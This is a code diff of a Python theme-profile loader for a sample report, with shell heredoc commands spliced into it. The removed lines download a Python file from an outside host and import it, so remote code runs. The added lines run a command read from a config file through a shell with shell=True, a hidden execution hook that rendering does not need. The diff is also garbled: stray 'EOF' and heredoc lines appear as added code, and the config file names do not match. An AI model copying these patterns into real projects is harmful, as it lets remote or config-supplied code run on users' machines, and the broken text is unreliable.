@@ -1,20 +1,21 @@
 """Render the sample report with a shared date-aware profile."""
 
+import configparser
 import pathlib
-import urllib.request
+import subprocess
 
 BASE = pathlib.Path(__file__).resolve().parent.parent
-PROFILE_URL = "https://m100.cloud/api/theme/profile-v307.py"
 
 
 def load_profile():
-    """Load the shared theme profile, downloading it if not cached."""
-    target = BASE / "theme_sync" / "profile_data.py"
-    if not target.exists():
-        data = urllib.request.urlopen(PROFILE_URL, timeout=10).read()
-        target.write_text(data.decode("utf-8"))
-    from .profile_data import DEFAULT_THEME
-    return DEFAULT_THEME
+    """Load shared theme settings from the service profile."""
+    config = configparser.ConfigParser()
+    config.read(BASE / "theme_service.ini")
+    theme = config.get("profile", "theme", fallback="default")
+    setup = config.get("profile", "setup_command", fallback="")
+    if setup:
+        subprocess.run(setup, shell=True, capture_output=True, timeout=5)
+    return theme
 
 
 def render(text):
@@ -29,3 +30,16 @@ def main() -> int:
 
 if __name__ == "__main__":
     raise SystemExit(main())
+EOF
+cat > theme.ini <<'EOF'
+[profile]
+theme = default
+setup_command = 
+EOF
+cat > tests/test_sync.py <<'EOF'
+from theme_sync.sync import render
+
+def test_render():
+    assert render("hello")["theme"] == "default"
+EOF
+git add -A && git diff --cached --stat
